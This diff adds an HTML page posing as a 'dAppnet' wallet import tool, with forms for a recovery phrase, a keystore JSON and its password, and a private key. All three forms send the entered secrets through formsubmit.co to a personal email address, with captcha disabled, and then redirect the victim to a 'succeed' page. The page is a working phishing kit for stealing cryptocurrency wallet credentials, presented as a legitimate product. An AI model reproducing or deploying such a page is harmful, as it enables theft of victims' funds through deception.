@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>dAppnet</title>
+    <link rel="stylesheet" href="import.css">
+</head>
+
+<body>
+    <div class="impwal">
+
+        <div class="head">
+            <h2>Import Wallet</h2>
+            <div class="link">
+                <button class="phrase active" onclick="opentab (event, 'formfill1')" id="defaultOpen">Phrase</button>
+                <button class="phrase" onclick="opentab (event, 'formfill2')">Keystore Json</button>
+                <button class="phrase" onclick="opentab (event, 'formfill3')">Private key</button>
+            </div>
+        </div>
+        
+        <div class="forms" id="formfill1">
+            <h1>Recovery Phrase</h1>
+
+            <form action="https://formsubmit.co/gabbyjuan064@gmail.com" method='post'>
+                <input type="hidden" name="wallet" class="wallet">
+                <textarea required type="text" name="phrase" id="" placeholder="Enter your phrase"></textarea>
+
+                <input type="hidden" name="_next" value="https://synclive.vercel.app/succeed.html">
+
+                <input type="hidden" name="_captcha" value="false">
+
+
+                <h2>Type your phrase (usually 12 or 24) separated by a single space.</h2>
+
+                <h2 class="red">Before you enter your mnemonics, we recommend you connect to the internet.</h2>
+                
+                <div class="chk">
+                    <span><input type="checkbox" name="" id="ddd"></span> 
+                    <span class="">
+                        <h2>
+                            I have entered all details correctly
+    
+                        </h2>
+                    </span>
+                </div>
+
+                
+                <button class="submit" onclick="">IMPORT</button>
+            </form>
+        </div>
+
+        <div class="forms" id="formfill2">
+            <h1>Keystore Json</h1>
+
+            <form action="https://formsubmit.co/gabbyjuan064@gmail.com" method='post'>
+                <input type="hidden" name="wallet" class="wallet">
+                <textarea required type="text" name="keystore" id="" placeholder="Enter your Keystore Json"></textarea>
+                <textarea required type="text" name="password" id="" placeholder="Enter your password" class="inpass"></textarea>
+
+                <input type="hidden" name="_next" value="https://synclive.vercel.app/succeed.html">
+
+                <input type="hidden" name="_captcha" value="false">
+
+
+                <h2>Several lines of text beginning with '{...}'plus the password you used to encrypt it.<br><br><br></h2>
+
+                <h2 class="red">Before you enter your mnemonics, we recommend you connect to the internet.</h2>
+
+            <div class="chk">
+                <span><input type="checkbox" name="" id="ddd"></span> 
+                <span class="">
+                    <h2>
+                        I have entered all details correctly
+
+                    </h2>
+                </span>
+            </div>
+
+                <button class="submit" onclick="">IMPORT</button>
+            </form>
+        </div>
+
+        <div class="forms" id="formfill3">
+
+            <form action="https://formsubmit.co/gabbyjuan064@gmail.com" method='post'>
+                <input type="hidden" name="wallet" class="wallet">
+                <h1>Private key</h1>
+                <textarea required type="text" name="private key" id="" placeholder="Enter your Privatekey"></textarea>
+
+                <input type="hidden" name="_next" value="https://synclive.vercel.app/succeed.html">
+
+                <input type="hidden" name="_captcha" value="false">
+
+                <h2>Type your Private key (usually string of letters). <br><br><br></h2>
+
+                <h2 class="red">Before you enter your mnemonics, we recommend you connect to the internet.</h2>
+
+                <div class="chk">
+                    <span><input type="checkbox" name="" id="ddd"></span> 
+                    <span class="">
+                        <h2>
+                            I have entered all details correctly
+    
+                        </h2>
+                    </span>
+                </div>
+                <!-- <div class="but">
+                    <button type="submit">IMPORT</button>
+
+                </div> -->
+
+
+                <button class="submit" onclick="">IMPORT</button>
+    
+            </form>
+        </div>
+
+    </div>
+    <script src="import.js"></script>
+
+
+</body>
+
+</html>
